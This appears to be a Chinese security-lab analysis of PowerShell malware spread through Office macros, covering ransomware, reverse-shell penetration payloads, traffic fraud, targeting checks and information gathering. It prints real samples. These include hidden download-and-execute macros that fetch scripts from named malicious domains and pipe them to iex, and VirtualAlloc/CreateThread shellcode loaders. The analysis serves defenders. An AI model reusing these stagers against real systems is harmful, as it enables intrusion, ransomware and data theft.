> 原文链接: https://www.anquanke.com//post/id/83751 


# Powershell恶意代码的N种姿势


                                阅读量   
                                **113935**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t01e3db55b81a8c0ef3.png)](https://p4.ssl.qhimg.com/t01e3db55b81a8c0ef3.png)

**引言**

人在做,天在看。

技术从来都是中性的,被用来行善还是作恶完全取决于运用它的人。原子能可以用来发电为大众提供清洁能源,也可以用来制造能毁灭全人类的核武器,这不是一个完善的世界,于是我们既有核电站也有了核武器。

Powershell,曾经Windows系统管理员的称手工具,在恶意代码制造和传播者手里也被玩得花样百出。由于Powershell的可执行框架部分是系统的组件不可能被查杀,而驱动它的脚本是非PE的而非常难以通过静态方法判定恶意性,同时脚本可以非常小巧而在系统底层的支持下功能却可以非常强大,这使利用Powershell的恶意代码绕过常规的病毒防护对系统为所欲为。因此,360天眼实验室近期看到此类恶意代码泛滥成灾就毫不奇怪,事实上,我们甚至看到所跟踪的APT团伙也开始转向Powershell。

本文我们向大家展示一些看到的实际恶意代码的例子。

**实例分析**

这里我们基于360威胁情报中心的数据,对接触到的Powershell恶意代码按分类各举一例。

**勒索软件**

我们知道现在勒索软件以其直接的变现方式现在已成为黑产的宠儿,像雨后春笋那样冒出来的勒索软件中,我们看到了使用纯Powershell脚本实现的例子。

样本MD5:ea7775da99367ac89f70f2a95c7f8e8e

这是一个通过Word文档中嵌入宏以诱导执行的勒索软件,使用工具提取出其中的宏,内容如下:
<li>
<pre>`"vba_code": "Private Sub      Document_Open() Dim FGHNBVRGHJJGFDSDUUUU As String FGHNBVRGHJJGFDSDUUUU =      "cmd /K " + "pow" + "er" + "Sh" +      "ell.e" + "x" + "e -WindowStyle hiddeN      -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile('http://rxlawyer.in/file.php','%TEMP%Y.ps1');      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%Y.ps1" Shell FGHNBVRGHJJGFDSDUUUU, 0 MsgBox      ("Module could not be found.") FGHHH = 7 * 2 DGHhhdRGHH = 9 + 23      End Sub`</pre>
</li>
宏的功能是下载http://rxlawyer.in/file.php到本地的temp目录下,并用Powershell运行这个文件。而下载回来的file.php本质上是一个ps的脚本文件,MD5为:dd180477d6a0bb6ce3c29344546ebdfc    。

勒索者脚本的实现原理是:通过随机生成加密密钥与用户ID,将加密密钥与用户ID信息上传到服务器进行备份,在用户机器上使用对称算法将用户的文档进行加密。因为密钥为随机生成,除非拥有攻击者服务器上备份的密钥,否则很难将被加密的文档进行还原。

脚本的原貌为:

[![](https://p3.ssl.qhimg.com/t01bc12a85522f45e1c.png)](https://p3.ssl.qhimg.com/t01bc12a85522f45e1c.png)

可见,脚本做了混淆处理,简单处理以后归纳出的脚本主要执行过程如下:

1.生成三个随机数,分别表示加密密钥、加密用的盐、UUID

[![](https://p3.ssl.qhimg.com/t014a1576c9d0413f60.png)](https://p3.ssl.qhimg.com/t014a1576c9d0413f60.png)

把上面生成随机数发送到服务器中保存

[![](https://p3.ssl.qhimg.com/t010185a1c4e4a8dd14.png)](https://p3.ssl.qhimg.com/t010185a1c4e4a8dd14.png)

2.用随机数生成加密容器

[![](https://p2.ssl.qhimg.com/t017fc7f4992df57166.png)](https://p2.ssl.qhimg.com/t017fc7f4992df57166.png)

[![](https://p3.ssl.qhimg.com/t01e3bb0194cc90b4da.png)](https://p3.ssl.qhimg.com/t01e3bb0194cc90b4da.png)

3.得到磁盘中的所有的指定后缀的文件

调用Get-PSDrive,得到所有文件名

$folder= gdr|where `{`$_.Free`}`|Sort-Object -Descending

[![](https://p5.ssl.qhimg.com/t0100f160ca66f6449a.png)](https://p5.ssl.qhimg.com/t0100f160ca66f6449a.png)

4.加密这些文件的前2048个字节后写回文件

[![](https://p5.ssl.qhimg.com/t010ece0247d2de35af.png)](https://p5.ssl.qhimg.com/t010ece0247d2de35af.png)

5.解码Base64得到提示勒索的html文件

[![](https://p5.ssl.qhimg.com/t0130a076d795a91081.png)](https://p5.ssl.qhimg.com/t0130a076d795a91081.png)

在html文件的尾部添加上赎回密钥用的UUID及当前时间

[![](https://p3.ssl.qhimg.com/t01f8cf158c5248793a.png)](https://p3.ssl.qhimg.com/t01f8cf158c5248793a.png)

**渗透测试**

此类样本大多使用网络上的nishang开源工具包生成的攻击文件。攻击文件以Word、Excel、CHM、LNK等格式的文件为载体,嵌入Payload,实现获得反弹Shell等功能,实现对系统的控制。

样本MD5:929d104ae3f02129bbf9fa3c5cb8f7a1

文件打开后,会显示文件损坏,用来迷惑用户,Word中的宏却悄然运行了。

[![](https://p2.ssl.qhimg.com/t01ec6948158dbc70cc.gif)](https://p2.ssl.qhimg.com/t01ec6948158dbc70cc.gif)

宏的内容为:



```
Sub AutoOpen()
Dim x
x = "powershell -window hidden -enc JAAxACA[……]APQA” _
&amp; "wB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A"
Shell ("POWERSHELL.EXE " &amp; x)
Dim title As String
title = "Critical Microsoft Office Error"
Dim msg As String
Dim intResponse As Integer
msg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."
intResponse = MsgBox(msg, 16, title)
Application.Quit
End Sub
```

将宏中的字符串,用Base64解码后,得到内容如下:

```
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x34,0xff,0xf9,0x18,0xd9,0xeb,0xd9,0x74,[……] ,0xda,0x73,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000)`{`$g = $z.Length`}`;$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) `{`$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)`}`;$w::CreateThread(0,0,$x,0,0,0);for (;;)`{`Start-sleep 60`}`;';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8)`{`$3 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";iex "&amp; $3 $2 $e"`}`else`{`;iex "&amp; powershell $2 $e";`}`
```



将其中的shellcode提取出来进行分析得知,这段shellcode的主要功能是反向连接内网IP 192.168.1.30的4444端口。

[![](https://p3.ssl.qhimg.com/t018d11dfc254d31678.png)](https://p3.ssl.qhimg.com/t018d11dfc254d31678.png)

另一个与上述样本有着类似功能的样本的MD5为:1e39753fd56f17010ac62b1d84b5e650

从文件中提取出来的宏为:

[![](https://p1.ssl.qhimg.com/t0162f93a418f9b92c9.png)](https://p1.ssl.qhimg.com/t0162f93a418f9b92c9.png)

而这四个函数对应的功能分别为

lExecute:

用Powershell下载invoke-shellcode.ps后,通过invoke-shellcode函数调用指定Payload windows/meterpreter/reverse_https 建立反弹shell,反弹的地址为98.100.108.133,端口为443

其中部分代码为:

[![](https://p1.ssl.qhimg.com/t012d8540833e76c92b.png)](https://p1.ssl.qhimg.com/t012d8540833e76c92b.png)

lPersist:

将Powershell建立反弹Shell的功能用VBS实现后,保存在C:UsersPublic10-D.vbs文件中

lReg

新建HKCUSoftwareMicrosoftWindows NTCurrentVersionWindowsLoad注册表,值指定为C:UsersPublic10-D.vbs

lStart

调用C:UsersPublic10-D.vbs

而有时,为了抵抗杀毒软件的追杀,样本通常会进行Base64编码。

MD5:c49ee3fb4897dd1cdab1d0ae4fe55988

下面为提取出来的宏内容,可见代码使用了Base64编码:

· "vba_code": "Sub Workbook_Open() 'VBA arch detect suggested by "T" Dim Command As String Dim str As String Dim exec As String Arch = Environ("PROCESSOR_ARCHITECTURE") windir = Environ("windir") If Arch = "AMD64" Then Command = windir + "syswow64windowspowershellv1.0powershell.exe" Else Command = "powershell.exe" End If str = "nVRtb9tGDP7uX0EIN0BCLEV+aZZYCNDUadZsdZrFbtLNMIazRFvXnO" str = str + "6U08mR4/q/j3I0x/06f9CZFI/PQ/Kh2BOcw3unNb2U8jrLtb"[……]str = str + "TjdLP9Fw==" exec = Command + " -NoP -NonI -W Hidden -Exec Bypass -Comm" exec = exec + "and ""Invoke-Expression $(New-Object IO.StreamRea" exec = exec + "

解码后的内容为:

$q = @"

[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpP

arameter, uint dwCreationFlags, IntPtr lpThreadId);

"@

try`{`$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()

function c($v)`{` return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)`}`

function t `{`$f = "";1..3|foreach-object`{`$f+= $d[(get-random -maximum $d.Length)]`}`;return $f;`}`

function e `{` process `{`[array]$x = $x + $_`}`; end `{`$x | sort-object `{`(new-object Random).next()`}``}``}`

function g`{` for ($i=0;$i -lt 64;$i++)`{`$h = t;$k = $d | e;  foreach ($l in $k)`{`$s = $h + $l; if (c($s)) `{` return $s `}``}``}`return "9vXU";`}`

[Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}`;$m = New-Object System.Net.WebClient;

$m.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");$n = g; [Byte[]] $p = $m.DownloadData("https://192.168.0.105:4444/$n

" )

$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru

$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)

$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400`}`catch`{``}`

脚本的功能是通过g函数随机生成四位的字符,从内网网址下载后加载执行[https://192.168.0.105:4444/xxxx](https://192.168.0.105:4444/xxxx) (其中xxxx为随机四位字符)

这里连接的是192.168.0.105为内网IP,此样本很可能是渗透者进行内网渗透攻击的测试样本。此类样本还有很多:

leae0906f98568c5fb25b2bb32b1dbed7

[![](https://p4.ssl.qhimg.com/t017313fe76f2e8dd26.png)](https://p4.ssl.qhimg.com/t017313fe76f2e8dd26.png)

l1a42671ce3b2701956ba49718c9e118e

[![](https://p1.ssl.qhimg.com/t0126a8391c56008bd1.png)](https://p1.ssl.qhimg.com/t0126a8391c56008bd1.png)

l496ed16e636203fa0eadbcdc182b0e85

[![](https://p4.ssl.qhimg.com/t01f6f9b381b96c6832.png)](https://p4.ssl.qhimg.com/t01f6f9b381b96c6832.png)

使用LNK文件,建立反弹shell的样本

[![](https://p0.ssl.qhimg.com/t01df229ddd1c056964.png)](https://p0.ssl.qhimg.com/t01df229ddd1c056964.png)

**流量欺骗**

为了快速提升网站流量、Alexa排名、淘宝网店访问量、博客人气、每日访问IP、PV、UV等,有些网站站长会采取非常规的引流方法,采用软件在后台模拟人正常访问网页的点击动作而达到提升流量的目的。



样本MD5:5f8dc4db8a658b7ba185c2f038f3f075

文档打开后里面只有“test by c”这几个文字

[![](https://p1.ssl.qhimg.com/t01cd83089da63a11c8.png)](https://p1.ssl.qhimg.com/t01cd83089da63a11c8.png)

提取出文档中的宏中的加密字符解密后得到可读的ps脚本如下

```
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,[……] ,0x31,0x32,0x38,0x2e,0x31,0x39,0x36,0x2e,0x38,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000)`{`$g = $z.Length`}`;$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) `{`$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)`}`;$w::CreateThread(0,0,$x,0,0,0);for (;;)`{`Start-sleep 60`}`;';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8)`{`$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-nop -noni -enc ";iex "&amp; $x86 $cmd $e"`}`else`{`$cmd = "-nop -noni -enc";iex "&amp; powershell $cmd $e";`}`
```

可见,ps脚本的主要功能就是执行Shellcode,这段Shellcode的功能就是调用wininet.dll中的函数进行连接138.128.196.84地址的443端口。而138.128.196.84地址正为流量宝类的软件用的地址。

[![](https://p1.ssl.qhimg.com/t01445b6bc0a0ecbe77.png)](https://p1.ssl.qhimg.com/t01445b6bc0a0ecbe77.png)

**探测控制**

样本对通过宏调用Powershell下载PE文件在受影响的系统上检查是否为关心的目标并执行进一步地操作,具备针对性攻击的特点。

样本MD5:fba6b329876533f28d317e60fe53c8d3

从样本中抽取出的宏主要是根据系统版本下载相应的文件执行



```
Sub AutoOpen()
    x1 = "Download"
    h = "Str"
    o = "power" &amp; "shell" &amp; ".exe"
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    abcdef = h &amp; "ing"
    Set objWMIService = GetObject("winmgmts:\" &amp; strComputer &amp; "rootcimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\" &amp; strComputer &amp; "rootcimv2:Win32_Process")
    objProcess.Create o &amp; " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) `{`(new-object Net.WebClient)." &amp; x1 &amp; abcdef &amp; "('http://rabbitons.pw/cache') | iex `}` else `{`(new-object Net.WebClient)." &amp; x1 &amp; abcdef &amp; "('http://rabbitons.pw/css') | iex`}`", Null, objConfig, intProcessID
```

其中的对应32位系统的cache文件的内容如下:

[![](https://p0.ssl.qhimg.com/t016c92809936d1331d.png)](https://p0.ssl.qhimg.com/t016c92809936d1331d.png)

我们对Shellcode进行简单分析:

1. 在内存中解密,生成一个PE文件,在内存中展开跳到入口点处执行,将PE文件的.BSS区段进行解码,解码算法如下:

[![](https://p5.ssl.qhimg.com/t0166d32576c77663ab.png)](https://p5.ssl.qhimg.com/t0166d32576c77663ab.png)

[![](https://p5.ssl.qhimg.com/t01fd54fb8707bbb491.png)](https://p5.ssl.qhimg.com/t01fd54fb8707bbb491.png)

解密后的结果为:

[![](https://p1.ssl.qhimg.com/t0104201bcb8afb77e0.png)](https://p1.ssl.qhimg.com/t0104201bcb8afb77e0.png)

2.判断是不是64位系统

[![](https://p0.ssl.qhimg.com/t0165c8188a593f651d.png)](https://p0.ssl.qhimg.com/t0165c8188a593f651d.png)



判断虚拟机

[![](https://p1.ssl.qhimg.com/t0104932d5b8b44cac1.png)](https://p1.ssl.qhimg.com/t0104932d5b8b44cac1.png)

[![](https://p3.ssl.qhimg.com/t0196d4538c16aa7374.png)](https://p3.ssl.qhimg.com/t0196d4538c16aa7374.png)

3. 用FindFirstUrlCacheEntry和FindNextUrlCacheEntry遍历IE临时文件目录 ,用于判断用户是否是攻击者的目标用户

[![](https://p4.ssl.qhimg.com/t011e65acb2344f101f.png)](https://p4.ssl.qhimg.com/t011e65acb2344f101f.png)

[![](https://p3.ssl.qhimg.com/t01167b5d39827107b8.png)](https://p3.ssl.qhimg.com/t01167b5d39827107b8.png)

4.计算用户和电脑信息的HASH

[![](https://p1.ssl.qhimg.com/t01dd5d7722f9d5c98b.png)](https://p1.ssl.qhimg.com/t01dd5d7722f9d5c98b.png)

随后B03938处创建线程进行下面的动作

判断ipconfig -all 命令中是否有.edu、school、hospital、colledge、health、nurse等字符串

[![](https://p1.ssl.qhimg.com/t01d98258853481e268.png)](https://p1.ssl.qhimg.com/t01d98258853481e268.png)

调用cmd /C ""ipconfig -all &gt; C:DOCUME~1yyyyyLOCALS~1Tempxxxx.TMP(xxx代表随机数)生成文件,检测.edu、school、hospital、colledge、health、nurse等字符串

[![](https://p1.ssl.qhimg.com/t01740d30cb720704c9.png)](https://p1.ssl.qhimg.com/t01740d30cb720704c9.png)

[![](https://p5.ssl.qhimg.com/t017e68939597e09a8d.png)](https://p5.ssl.qhimg.com/t017e68939597e09a8d.png)

5. 遍历系统中的进程,检测有否指定hash的进程正在运行,

[![](https://p4.ssl.qhimg.com/t011c865490a0b4507d.png)](https://p4.ssl.qhimg.com/t011c865490a0b4507d.png)

从IE缓存中查找用户是不是访问过这些网址:

通过WININET.FindFirstUrlCacheEntryW   WININET.FindNextUrlCacheEntryW WININET.FindCloseUrlCache

[![](https://p4.ssl.qhimg.com/t01bf1c3bb05e2c4ec4.png)](https://p4.ssl.qhimg.com/t01bf1c3bb05e2c4ec4.png)

得到net view命令返回值中是否有pos、store、shop、sale等字符串

[![](https://p1.ssl.qhimg.com/t01c6cdec3ec4e3654d.png)](https://p1.ssl.qhimg.com/t01c6cdec3ec4e3654d.png)

[![](https://p2.ssl.qhimg.com/t0115b1447911ede0ef.png)](https://p2.ssl.qhimg.com/t0115b1447911ede0ef.png)

发送用户信息,并下载相对应的恶意程序:

[![](https://p4.ssl.qhimg.com/t013788c5e64d32344a.png)](https://p4.ssl.qhimg.com/t013788c5e64d32344a.png)

其中,用这种手法的恶意样本还有如下:

样本HASH

系统版本

下载地址
<td width="151" rowspan="2" valign="top" style="border-right-color: black;border-bottom-color: black;border-left-color: black;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-top-style: none;padding: 0px 7px">f0483b9cfb8deb7ff97962b30fc779ad</td><td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">32位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">https://github.com/flowsdem/found/raw/master/rost</td>

32位
<td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">64位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">https://github.com/flowsdem/found/raw/master/virst</td>

https://github.com/flowsdem/found/raw/master/virst
<td width="151" rowspan="2" valign="top" style="border-right-color: black;border-bottom-color: black;border-left-color: black;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-top-style: none;padding: 0px 7px">fba6b329876533f28d317e60fe53c8d3</td><td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">32位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">http://rabbitons.pw/cache</td>

32位
<td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">64位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">http://rabbitons.pw/css</td>

http://rabbitons.pw/css
<td width="151" rowspan="2" valign="top" style="border-right-color: black;border-bottom-color: black;border-left-color: black;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-top-style: none;padding: 0px 7px">62967bf585eef49f065bac233b506b36</td><td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">32位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">https://github.com/minifl147/flue/raw/master/memo</td>

32位
<td width="75" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">64位</td><td width="225" valign="top" style="border-top-style: none;border-left-style: none;border-bottom-color: black;border-bottom-width: 1px;border-right-color: black;border-right-width: 1px;padding: 0px 7px">https://github.com/minifl147/flue/raw/master/adv</td>

https://github.com/minifl147/flue/raw/master/adv

**信息搜集**

样本中的宏代码下载执行信息收集类的Powershell脚本,很可能是某些针对性攻击的前导。

样本MD5:f7c3c7df2e7761eceff991bf457ed5b9

提取出来的宏代码为:

[![](https://p1.ssl.qhimg.com/t01366c84e3818726b0.png)](https://p1.ssl.qhimg.com/t01366c84e3818726b0.png)

下载一个名为Get-Info-2.ps1的脚本,脚本功能是将本机的IP地址、domainname、username、usbid等发送到远端服务器中。

[![](https://p1.ssl.qhimg.com/t01b06b996243f448d7.png)](https://p1.ssl.qhimg.com/t01b06b996243f448d7.png)

**总结**

天眼实验室再次提醒用户,此类恶意软件主要依赖通过微软的Office文档传播,用户应该确保宏不默认启用,提防任何来自不受信任来源的文件,当打开文件系统提示要使用宏时务必慎重。同时要尽量选用可靠的安全软件进行防范,如无必要不要关闭安全软件,当发现系统出现异常情况,应及时查杀木马,尽可能避免各类恶意代码的骚扰。

**参考资料**

l[http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml](http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml)

l[https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/](https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/)

l[https://www.10dsecurity.com/](https://www.10dsecurity.com/)
